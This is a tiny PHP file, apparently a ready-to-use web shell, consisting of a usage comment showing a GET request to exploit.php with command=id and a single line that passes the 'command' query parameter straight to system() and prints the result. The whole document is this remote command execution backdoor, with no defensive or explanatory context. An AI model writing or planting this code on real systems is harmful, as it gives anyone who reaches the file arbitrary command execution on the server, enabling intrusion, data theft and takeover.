# Use: GET /example/exploit.php?command=id HTTP/1.1
<?php echo system($_GET['command']); ?>
